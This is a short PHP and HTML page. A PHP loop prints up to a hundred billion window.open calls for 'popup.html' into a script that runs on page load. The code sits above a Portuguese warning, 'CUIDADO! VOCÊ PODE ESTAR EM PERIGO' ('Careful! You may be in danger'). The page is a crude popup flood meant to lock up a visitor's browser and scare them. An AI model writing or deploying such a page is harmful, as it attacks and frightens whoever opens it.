<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta charset="UTF-8">
	<link rel="stylesheet" href="Css/style.css"/>
</head>
<body>
	<?php 
	echo "<script>";
	for ($i=0; $i <= 100000000000 ; $i++) { 
		echo "window.open ('popup.html', 'popup')";
	}
echo "</script>";
?>
	<center>
		<h1 class="titulo">CUIDADO!</h1>
		<span class="text-frase">VOCÊ PODE ESTAR EM PERIGO</span>
		<br>
	</center>	
</body>
</html>